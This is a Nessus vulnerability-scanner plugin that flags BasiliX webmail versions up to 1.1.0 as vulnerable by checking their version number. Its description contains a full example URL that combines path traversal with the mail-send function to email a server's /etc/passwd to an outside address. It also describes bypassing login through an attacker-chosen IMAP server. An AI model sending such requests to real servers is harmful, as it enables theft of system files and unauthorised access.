#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(14305);
  script_version ("$Revision: 1.8 $"); 

  script_cve_id("CAN-2002-1710");
  script_bugtraq_id(5062);

  name["english"] = "BasiliX Arbitrary File Disclosure Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The target is running at least one instance of BasiliX whose version
number is 1.1.0 or lower.  Such versions allow retrieval of arbitrary
files that are accessible to the web server user when sending a
message since (1) they accept a list of attachment names from the
client and (2) they do not verify that attachments were in fact
uploaded. 

For example, assuming you have logged in and accepted the requisite
cookies, opening a URL like the following would likely cause
/etc/passwd to be sent to you@example.com :

  http://target/basilix/basilix.php?RequestID=CMPSSEND
    &is_js=1.4
    &cmps_from=Me
    &cmps_to=you@example.com
    &cmps_body=Here%20is%20the%20file%20you%20requested.
    &cmps_f0=../../../../../etc/passwd

Further, since these versions do not sanitize input to login.php3,
it's possible for an attacker to establish a session on the target
without otherwise having access there by authenticating against an
IMAP server of his or her choosing. 

***** Nessus has determined the vulnerability exists on the target
***** simply by looking at the version number(s) of BasiliX
***** installed there. 

Solution : Upgrade to BasiliX version 1.1.1 or later.
Risk factor : Medium";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Arbitrary File Disclosure Vulnerability in BasiliX";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "Remote file access";
  script_family(english:family["english"]);

  script_dependencie("basilix_detect.nasl");
  script_require_ports("services/www", 80);

  exit(0);
}


include("http_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/basilix"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];

  if (ver =~ "^(0\..*|1\.(0.*|1\.0))$") {
    security_warning(port);
    exit(0);
  }
}
